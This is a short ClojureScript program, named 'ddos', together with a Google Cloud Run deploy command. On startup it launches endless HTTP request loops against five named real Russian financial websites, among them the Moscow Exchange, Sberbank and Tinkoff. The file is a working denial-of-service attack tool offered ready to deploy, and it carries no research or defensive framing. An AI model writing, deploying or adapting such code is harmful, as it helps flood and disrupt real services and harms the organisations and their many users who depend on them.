(ns ddos
  (:require
   ["express" :as express]
   ["axios" :as axios]
   [oops.core :refer [ocall oget]]
   [cljs.core.async :refer [go-loop timeout]]
   [cljs.core.async.interop :refer-macros [<p!]]
   [utils.async :refer [async await await-all sleep]]))

;; gcloud run deploy ddos --source . --set-env-vars GOOGLE_CLOUD_PROJECT=ddos

(def urls
  ["https://www.moex.com/",
   "https://www.finam.ru/quotes/stocks/russia/",
   "https://www.sberbank.ru/",
   "https://www.rosbank.ru/",
   "https://www.tinkoff.ru/"])

(defn attack-url! [url]
  (go-loop []
    (let [response (try (<p! (ocall axios :get url))
                        (catch js/Error e
                          (js/console.log (oget e :code))
                          nil))
          _ (when response (js/console.log url ": " response))
          _ (timeout 500)]
      (recur))))

(defn attack! []
  (doseq [url urls]
    (attack-url! url)))

(defn start! []
  (let [app (express)
        port (or js/process.env.PORT 8080)]
    (.get app "/" (fn [_req res]
                    (.send res "Hello")))
    (.listen app port #(js/console.log "ddos-service: listening on port " port))
    (attack!)))